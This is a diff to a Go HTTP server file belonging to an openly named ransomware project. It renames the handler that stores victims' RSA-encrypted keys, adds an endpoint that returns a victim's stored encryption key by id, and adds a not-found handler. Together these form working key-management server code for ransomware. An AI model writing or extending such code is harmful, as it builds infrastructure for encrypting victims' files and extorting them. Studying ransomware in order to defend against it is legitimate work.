@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/hex"
 	"encoding/json"
+	"fmt"
 	"net/http"
 
 	"github.com/julienschmidt/httprouter"
@@ -10,7 +11,7 @@ import (
 	"github.com/mauri870/ransomware/rsa"
 )
 
-func validateAndPersistKeys(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
+func addKeys(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
 	w.Header().Set("Content-Type", "application/json")
 
 	r.ParseForm()
@@ -44,7 +45,7 @@ func validateAndPersistKeys(w http.ResponseWriter, r *http.Request, ps httproute
 	}
 
 	// If nothing goes wrong, persist the keys...
-	db := repository.Open("./database.db")
+	db := repository.Open(Database)
 	defer db.Close()
 
 	if !db.IsAvailable(keys["id"]) {
@@ -57,6 +58,31 @@ func validateAndPersistKeys(w http.ResponseWriter, r *http.Request, ps httproute
 
 	// Success \o/
 	w.WriteHeader(http.StatusNoContent)
+}
+
+func getEncryptionKey(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
+	id := ps.ByName("id")
+	if len(id) != 32 {
+		http.Error(w, ApiResponseBadRequest, 400)
+		return
+	}
+
+	// If nothing goes wrong, try get the encryption key...
+	db := repository.Open(Database)
+	defer db.Close()
+
+	enckey, err := db.Find(id)
+	if err != nil {
+		http.Error(w, ApiResponseResourceNotFound, 418)
+		return
+	}
+
+	fmt.Fprintf(w, `{"status": 200, "enckey": "%s"}`, enckey)
+}
+
+func notFound(w http.ResponseWriter, r *http.Request) {
+	http.Error(w, ApiResponseNotFound, http.StatusNotFound)
+	return
 }
 
 // Parse the json keys
